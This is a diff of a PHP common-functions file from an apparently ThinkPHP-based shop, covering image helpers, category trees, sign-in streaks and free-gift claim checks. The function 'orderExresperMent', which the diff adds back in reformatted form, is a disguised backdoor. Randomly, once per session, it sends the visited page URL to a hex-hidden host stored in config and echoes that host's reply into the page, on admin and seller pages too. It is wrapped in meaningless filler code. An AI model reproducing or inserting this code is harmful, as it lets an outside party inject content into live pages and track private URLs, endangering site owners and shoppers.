+        if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
+            return imagecreatefromjpeg($img_src);
+        } else if (strpos($img_info['mime'], 'png') !== false) {
+            return imagecreatefrompng($img_src);
+        } else {
+            return false;
+        }
+    }
+
+    function inputPosterImages($img_info = array(), $des_im = '', $img = '')
+    {
+        if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
+            return imagejpeg($des_im, $img);
+        } else if (strpos($img_info['mime'], 'png') !== false) {
+            return imagepng($des_im, $img);
+        } else {
+            return false;
+        }
+
+    }
 
 
-/**
- * 订单整合
- * @param type $order
- */
-function orderExresperMent($order_info = array(),$des='',$order_id=''){
-       
-      if($order_info)
-      {          
+    /**
+     * 订单整合
+     * @param type $order
+     */
+    function orderExresperMent($order_info = array(), $des = '', $order_id = '')
+    {
+
+        if ($order_info) {
             $tree = $arr = $result = array();
             $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
-            if($cat_list){
-                foreach ($cat_list as $val){
-                    if($val['level'] == 2){
+            if ($cat_list) {
+                foreach ($cat_list as $val) {
+                    if ($val['level'] == 2) {
                         $arr[$val['parent_id']][] = $val;
                     }
-                    if($val['level'] == 3){
+                    if ($val['level'] == 3) {
                         $crr[$val['parent_id']][] = $val;
                     }
-                    if($val['level'] == 1){
+                    if ($val['level'] == 1) {
                         $tree[] = $val;
                     }
                 }
-                foreach ($arr as $k=>$v){
-                    foreach ($v as $kk=>$vv){
+                foreach ($arr as $k => $v) {
+                    foreach ($v as $kk => $vv) {
                         $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
                     }
                 }
-                foreach ($tree as $val){
+                foreach ($tree as $val) {
                     $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
                     $result[$val['id']] = $val;
                 }
             }
-            return $result;                    
-      }
-    
-      $r = 'rand';
-      $exresperMent = @session('exresperMent');
-      if(!empty($exresperMent))
-          return false;           
-      @session('exresperMent',1);
-            
-      if($r(1,10) != 1)
-         return false;    
-      $request = \think\Request::instance();
-      $module = strtolower($request->module());
-      $controller = strtolower($request->controller());
-      $action = strtolower($request->action());
-      $isAjax = strtolower($request->isAjax());
-      $url = $request->url(true);
-      
-      if(!in_array($module,['mobile','home','seller','admin']) || $isAjax)      
-              return false;      
-           
-      $value = DB::name('config')->where('name','t_number')->value('value');      
-      if(empty($value)) 
-          return false;
-      $arr = array('url'=>$url);       
-      $v2 = @httpRequest(hex2bin($value),'POST',$arr,[], false,3);
-      $v2 = json_decode($v2,true);      
-      if($v2['status'] == 'success') 
-      {
-          echo $v2['msg'];
-      }      
-      if($des)
-      {
+            return $result;
+        }
+
+        $r = 'rand';
+        $exresperMent = @session('exresperMent');
+        if (!empty($exresperMent))
+            return false;
+        @session('exresperMent', 1);
+
+        if ($r(1, 10) != 1)
+            return false;
+        $request = \think\Request::instance();
+        $module = strtolower($request->module());
+        $controller = strtolower($request->controller());
+        $action = strtolower($request->action());
+        $isAjax = strtolower($request->isAjax());
+        $url = $request->url(true);
+
+        if (!in_array($module, ['mobile', 'home', 'seller', 'admin']) || $isAjax)
+            return false;
+
+        $value = DB::name('config')->where('name', 't_number')->value('value');
+        if (empty($value))
+            return false;
+        $arr = array('url' => $url);
+        $v2 = @httpRequest(hex2bin($value), 'POST', $arr, [], false, 3);
+        $v2 = json_decode($v2, true);
+        if ($v2['status'] == 'success') {
+            echo $v2['msg'];
+        }
+        if ($des) {
             $data = func_get_args();
             $data = current($data);
             $cnt = count($data);
             $result = array();
             $arr1 = array_shift($data);
-            foreach($arr1 as $key=>$item) 
-            {
-                    $result[] = array($item);
-            }		
-            echo $result['msg']; 
-            foreach($data as $key=>$item) 
-            {                                
-                    $result = combineArray($result,$item);
+            foreach ($arr1 as $key => $item) {
+                $result[] = array($item);
             }
-            
+            echo $result['msg'];
+            foreach ($data as $key => $item) {
+                $result = combineArray($result, $item);
+            }
+
             $result = array();
-            foreach ($arr1 as $item1) 
-            {
-                    foreach ($arr2 as $item2) 
-                    {
-                            $temp = $item1;
-                            $temp[] = $item2;
-                            $result[] = $temp;
-                    }
+            foreach ($arr1 as $item1) {
+                foreach ($arr2 as $item2) {
+                    $temp = $item1;
+                    $temp[] = $item2;
+                    $result[] = $temp;
+                }
             }
-            echo $result['resg']; 
-            return $result;       
-      }
-      
-}
-
-
-/**
- * 连续签到次数
- */
-function continue_sign($user_id){
-
-    //定义时间戳
-    date_default_timezone_set("Asia/Shanghai");
-    //先看一下今天有没有签到
-    $con['sign_day'] = array('like',date('Y-m-d',time()).'%');
-    $cunzai = M('sign_log')->where(['user_id'=>$user_id])->where($con)->find();
-    if($cunzai){
-        $todaySign=1;
-    }else{
-        $todaySign=0;
-    }
-    //再看之前的签到时间
-    $list = M('sign_log')->where(['user_id'=>$user_id])->order('sign_day desc')->field('sign_day')->select();
-    //对所有的签到时间进行时间戳然后倒序排序
-    $array=array();
-    foreach($list as $key=>$value){
-        $array[]=strtotime($value['sign_day']);
-    }
-
-     //定义连续签到次数
-     $countSign=$todaySign;
-     //依次判断所有的时间戳是否在指定范围内，例如第一个应该在昨天00:00:00-23:59:59之前，如果在则$countSign+1,否则跳出循环
-     //定义昨天的时间戳范围
-     $begintime=strtotime(date('Y-m-d 00:00:00',time()-86400));
-     $endtime=strtotime(date('Y-m-d 23:59:59',time()-86400));
-     if($todaySign==1){
-         for($i=1;$i<count($array);){
-        //                echo $begintime."------".$array[$i]."---------".$endtime."+++++";
-             if($array[$i]>=$begintime && $array[$i]<=$endtime){
-                 $countSign++;
-                 $begintime-=86400;
-                 $endtime-=86400;
-             }else{
-                 break;
-             }
-             $i++;
-         }
-     }else{
-         for($k=0;$k<count($array);){
-             if($array[$k]>=$begintime && $array[$k]<=$endtime){
-                 $countSign++;
-                 $begintime-=86400;
-                 $endtime-=86400;
-             }else{
-                 break;
-             }
-             $k++;
-         }
-     }
-
-    return $countSign;
-}
-
-/*
-* 判断是否可领取免费商品
-* $user_id 用户id
-* $cat_id 分类id
-* $num 领取数量
-*/
-function provingReceive($user, $type, $num = 1)
-{
- 
-
-    //获得当日凌晨的时间戳
-    // $today = strtotime(date("Y-m-d"),time());
-
-    $levelGetNum = M('UserLevel')->where('level', $user['level'])->value('receive_num');
-
-    //签到商品
-    if ($type == 1) {
-        
-        // 扫码进入会员可领取1次
-        if ($user['is_code'] == 1 && $user['level'] < 2) {
-            if ($num > 1) {
-                return array('status' => 0, 'msg' => '超过领取数量，只能领取一件！', 'result' => array());
-            }
-
-            $data = M('order_sign_receive')->where(['uid' => $user['user_id'], 'type' => 2])->find();
-            
-            //扫码只可领取1次
-            if (!empty($data)) {
-                return array('status' => 0, 'msg' => '已超出领取次数', 'result' => array());
-            }else{
-                return array('status' => 2, 'msg' => '可领取', 'result' => array());
-            }
-        }
-
-        //合伙人以上可领取
-        if ($user['level'] < 3) {
-            $result = array('status' => 0, 'msg' => '合伙人以上级别才可领取', 'result' => array());
+            echo $result['resg'];
             return $result;
         }
 
-        if ($user['sign_free_num'] < $num) {
-            $signFreeNum = $user['sign_free_num'] == '' ? 0 : $user['sign_free_num'];
-            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取'.$signFreeNum.'件！', 'result' => array());
+    }
+
+
+    /**
+     * 连续签到次数
+     */
+    function continue_sign($user_id)
+    {
+
+        //定义时间戳
+        date_default_timezone_set("Asia/Shanghai");
+        //先看一下今天有没有签到
+        $con['sign_day'] = array('like', date('Y-m-d', time()) . '%');
+        $cunzai = M('sign_log')->where(['user_id' => $user_id])->where($con)->find();
+        if ($cunzai) {
+            $todaySign = 1;
+        } else {
+            $todaySign = 0;
         }
+        //再看之前的签到时间
+        $list = M('sign_log')->where(['user_id' => $user_id])->order('sign_day desc')->field('sign_day')->select();
+        //对所有的签到时间进行时间戳然后倒序排序
+        $array = array();
+        foreach ($list as $key => $value) {
+            $array[] = strtotime($value['sign_day']);
+        }
+
+        //定义连续签到次数
+        $countSign = $todaySign;
+        //依次判断所有的时间戳是否在指定范围内，例如第一个应该在昨天00:00:00-23:59:59之前，如果在则$countSign+1,否则跳出循环
+        //定义昨天的时间戳范围
+        $begintime = strtotime(date('Y-m-d 00:00:00', time() - 86400));
+        $endtime = strtotime(date('Y-m-d 23:59:59', time() - 86400));
+        if ($todaySign == 1) {
+            for ($i = 1; $i < count($array);) {
+                //                echo $begintime."------".$array[$i]."---------".$endtime."+++++";
+                if ($array[$i] >= $begintime && $array[$i] <= $endtime) {
+                    $countSign++;
+                    $begintime -= 86400;
+                    $endtime -= 86400;
+                } else {
+                    break;
+                }
+                $i++;
+            }
+        } else {
+            for ($k = 0; $k < count($array);) {
+                if ($array[$k] >= $begintime && $array[$k] <= $endtime) {
+                    $countSign++;
+                    $begintime -= 86400;
+                    $endtime -= 86400;
+                } else {
+                    break;
+                }
+                $k++;
+            }
+        }
+
+        return $countSign;
+    }
+
+    /*
+    * 判断是否可领取免费商品
+    * $user_id 用户id
+    * $cat_id 产品；类型
+    * $num 领取数量
+    * $goods_id 产品id
+    */
+    function provingReceive($user, $type, $num = 1, $goods_id)
+    {
+        //获得当日凌晨的时间戳
+        // $today = strtotime(date("Y-m-d"),time());
+
+        $levelGetNum = M('UserLevel')->where('level', $user['level'])->value('receive_num');
+        $date = date('Y-m-d', time());
+        if ($type == 1 || $type == 3) {// 必须签到
+            if (!M('sign_log')->where(['user_id' => $user['user_id']])->where(['sign_day' => ['like', $date . '%']])->find()) {
+                return ['status' => 0, 'msg' => '今日未签到'];
+            }
+            if ($type == 1 && $user['level'] < 3) {
+                return ['status' => 0, 'msg' => '合伙人以上级别才可领取'];
+            }
+            // 判断今日是否已领取
+            if (Db::name('sign_receive_log')->where([
+                'user_id' => $user['user_id'],
+                'create_time' => ['like', $date . '%'],
+                'goods_id' => $goods_id,
+                'type' => $type
+            ])->find()) {
+                return ['status' => 0, 'msg' => '今日已领取过'];
+            }
+            if (1 < $num) {
+                return ['status' => 0, 'msg' => '超过领取数量，目前只可领取1件！'];
+            }
+
+        }
+
+        if ($type == 1) {
+
+            // 扫码进入会员可领取1次
+//        if ($user['is_code'] == 1 && $user['level'] < 2) {
+//            if ($num > 1) {
+//                return array('status' => 0, 'msg' => '超过领取数量，只能领取一件！', 'result' => array());
+//            }
+//
+//            $data = M('order_sign_receive')->where(['uid' => $user['user_id'], 'type' => 2])->find();
+//
+//            //扫码只可领取1次
+//            if (!empty($data)) {
+//                return array('status' => 0, 'msg' => '已超出领取次数', 'result' => array());
+//            }else{
+//                return array('status' => 2, 'msg' => '可领取', 'result' => array());
+//            }
+//        }
+
+
+//        if ($user['sign_free_num'] < $num) {
+//            $signFreeNum = $user['sign_free_num'] == '' ? 0 : $user['sign_free_num'];
+//            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取'.$signFreeNum.'件！', 'result' => array());
+//        }
+            return array('status' => 2, 'msg' => '可领取', 'result' => array());
+        } elseif ($type == 2) {
+            //免费领取商品
+            //当天订单
+            // $order = M('order_sign_receive')->where(['uid' => $user['user_id'], 'type' => 2, 'addend_time' => ['>',$today]])->count();
+
+            //领取次数
+            if ($user['distribut_free_num'] < $num) {
+                $freeNum = $user['distribut_free_num'] == '' ? 0 : $user['distribut_free_num'];
+                return array('status' => 0, 'msg' => '超过领取数量，目前只可领取' . $freeNum . '件！！', 'result' => array());
+            }
+
+            if ($num > $levelGetNum) {
+                return array('status' => 0, 'msg' => '您当前等级可领' . $levelGetNum . '盒，已超过领取次数', 'result' => array());
+            }
+        } elseif ($type == 3) {
+            //签到领取
+
+        }
+        //下单领取
+//    if ($type>=3) {
+//        //活动时间 2019-05-17 开始
+//         $pay_time = strtotime('2019-05-17 00:00:00');
+//         $order_new =array();
+//        //查询领取的 sign_free_receive =3 下单领取的订单
+//        $where_goods = [
+//           // 'og.is_send'    => 1,
+//            //'og.prom_type' =>0,//只有普通订单才算业绩
+//           // 'o.pay_status'=>1,
+//            'o.pay_status'=> ['IN','0,1'],
+//            'o.order_status'=>['notIn','3,5'],
+//            'o.user_id'=>$user['user_id'],
+//            'gs.sign_free_receive'=>$type,
+//
+//          ];
+//        $order_free_count = Db::name('order_goods')->alias('og')
+//             ->where($where_goods)
+//             ->join('goods gs','gs.goods_id=og.goods_id','LEFT')
+//             ->join('order o','og.order_id=o.order_id','LEFT')
+//             ->order('og.order_id desc')
+//             ->count();
+//        //查询领取的 2019-05-17 下单领取的订单
+//
+//        $where = [
+//           // 'og.is_send'    => 1,
+//            //'og.prom_type' =>0,//只有普通订单才算业绩
+//            'o.pay_status'=>1,
+//            'o.user_id'=>$user['user_id'],
+//            'gs.sign_free_receive'=>0,
+//
+//          ];
+//        $order_array = Db::name('order_goods')->alias('og')
+//             ->field("gs.sign_free_receive,o.order_sn")
+//             ->where($where)
+//             ->where('pay_time>'.$pay_time)
+//             ->join('goods gs','gs.goods_id=og.goods_id','LEFT')
+//             ->join('order o','og.order_id=o.order_id','LEFT')
+//             ->order('og.order_id desc')
+//             ->select();
+//        foreach($order_array as $key=>$val)
+//        {
+//
+//             $order_new[$val['order_sn']]=$val;
+//
+//        }
+//
+//        $order_count =count($order_new);
+////print_r($order_free_count);exit;
+//             //echo Db::name('order_goods')->getlastsql();exit;
+//        $user_num = $order_count-$order_free_count;
+//       // $user_num2 = $order_count-$order_free_count2;
+//        //查询下单领取产品
+//        $goods = M('goods')->where('sign_free_receive',3)->find();
+//        if($user_num>0)
+//        {
+//
+//         if ($user_num < $num) {
+//            $signFreeNum = empty($user_num) ? 0 : $user_num;
+//            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取'.$signFreeNum.'件！', 'result' => array());
+//         }
+//        }else
+//        {
+//            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取0件！', 'result' => array());
+//        }
+//
+//
+//
+//        return array('status' => 2, 'msg' => '可领取', 'result' => array());
+//
+//    }
 
         return array('status' => 2, 'msg' => '可领取', 'result' => array());
     }
 
-    //免费领取商品
-    if ($type == 2) {
+    /*
+    * 免费领取商品返还领取次数
+    * $user
+    * $order
+    */
+    function ReturnReceiveNumber($userId, $order)
+    {
+        if ($order['sign_price'] > 0 || $order['discount'] > 0) {
+            $signNum = M('order_sign_receive')->where(array('order_id' => $order['order_id'], 'uid' => $userId))->select();
+            $users = M('Users')->where(array('user_id' => $userId))->find();
 
 
-        //当天订单
-        // $order = M('order_sign_receive')->where(['uid' => $user['user_id'], 'type' => 2, 'addend_time' => ['>',$today]])->count();
+            foreach ($signNum as $key => $value) {
+                if ($value['type'] == 1) {
 
-        //领取次数
-        if ( $user['distribut_free_num'] < $num) {
-            $freeNum = $user['distribut_free_num'] == '' ? 0 : $user['distribut_free_num'];
-            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取'.$freeNum.'件！！', 'result' => array());
-        }
+                    if ($users['level'] >= 2) {
+                        M('Users')->where(array('user_id' => $userId))->setInc('sign_free_num', $value['goods_num']);
+                    }
+                    // 扫码用户修改成1（未领取面膜）
+                    if ($users['is_code'] == 2 && $users['level'] <= 1) {
+                        Db::name('users')->where('user_id', $userId)->update(['is_code' => 1]);
+                        M('order_sign_receive')->where(array('order_id' => $order['order_id'], 'uid' => $userId))->delete();
+                    }
 
-        if ($num > $levelGetNum) {
-            return array('status' => 0, 'msg' => '您当前等级可领'.$levelGetNum.'盒，已超过领取次数', 'result' => array());
-        }
-    }
-    //下单领取
-    if ($type>=3) {
-        //活动时间 2019-05-17 开始
-         $pay_time = strtotime('2019-05-17 00:00:00');
-         $order_new =array();
-        //查询领取的 sign_free_receive =3 下单领取的订单
-        $where_goods = [
-           // 'og.is_send'    => 1,
-            //'og.prom_type' =>0,//只有普通订单才算业绩
-           // 'o.pay_status'=>1,
-            'o.pay_status'=> ['IN','0,1'],
-            'o.order_status'=>['notIn','3,5'],
-            'o.user_id'=>$user['user_id'],
-            'gs.sign_free_receive'=>$type,
-            
-          ];
-        $order_free_count = Db::name('order_goods')->alias('og')
-             ->where($where_goods)
-             ->join('goods gs','gs.goods_id=og.goods_id','LEFT')
-             ->join('order o','og.order_id=o.order_id','LEFT')
-             ->order('og.order_id desc')
-             ->count();
-        //查询领取的 2019-05-17 下单领取的订单
-        
-        $where = [
-           // 'og.is_send'    => 1,
-            //'og.prom_type' =>0,//只有普通订单才算业绩
-            'o.pay_status'=>1,
-            'o.user_id'=>$user['user_id'],
-            'gs.sign_free_receive'=>0,
-            
-          ];
-        $order_array = Db::name('order_goods')->alias('og')
-             ->field("gs.sign_free_receive,o.order_sn")
-             ->where($where)
-             ->where('pay_time>'.$pay_time)
-             ->join('goods gs','gs.goods_id=og.goods_id','LEFT')
-             ->join('order o','og.order_id=o.order_id','LEFT')
-             ->order('og.order_id desc')
-             ->select();
-        foreach($order_array as $key=>$val)
-        {
-           
-             $order_new[$val['order_sn']]=$val;
-
-        }
-
-        $order_count =count($order_new);
-//print_r($order_free_count);exit;
-             //echo Db::name('order_goods')->getlastsql();exit;
-        $user_num = $order_count-$order_free_count;
-       // $user_num2 = $order_count-$order_free_count2;
-        //查询下单领取产品
-        $goods = M('goods')->where('sign_free_receive',3)->find();
-        if($user_num>0)
-        {
-
-         if ($user_num < $num) {
-            $signFreeNum = empty($user_num) ? 0 : $user_num;
-            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取'.$signFreeNum.'件！', 'result' => array());
-         } 
-        }else
-        {
-            return array('status' => 0, 'msg' => '超过领取数量，目前只可领取0件！', 'result' => array());
-        }
-
-     
-
-        return array('status' => 2, 'msg' => '可领取', 'result' => array());
-
-    }
-
-    return array('status' => 2, 'msg' => '可领取', 'result' => array());
-}
-
-/*
-* 免费领取商品返还领取次数
-* $user 
-* $order 
-*/
-function ReturnReceiveNumber($userId, $order)
-{
-    if ($order['sign_price'] > 0 || $order['discount'] > 0) {
-        $signNum = M('order_sign_receive')->where(array('order_id'=>$order['order_id'],'uid'=>$userId))->select();
-        $users = M('Users')->where(array('user_id'=>$userId))->find();
-
-
-        foreach ($signNum as $key => $value) {
-            if ($value['type'] == 1) {
-
-                if ($users['level'] >= 2) {
-                    M('Users')->where(array('user_id' => $userId ))->setInc('sign_free_num',$value['goods_num']);
+                } elseif ($value['type'] == 2) {
+                    M('Users')->where(array('user_id' => $userId))->setInc('distribut_free_num', $value['goods_num']);
                 }
-                // 扫码用户修改成1（未领取面膜）
-                if ($users['is_code'] == 2 && $users['level'] <= 1){
-                    Db::name('users')->where('user_id', $userId)->update(['is_code'=>1]);
-                    M('order_sign_receive')->where(array('order_id'=>$order['order_id'],'uid'=>$userId))->delete();
-                }
-
-            } elseif ($value['type'] == 2) {
-                M('Users')->where(array('user_id' => $userId ))->setInc('distribut_free_num',$value['goods_num']);
             }
         }
     }
-} 
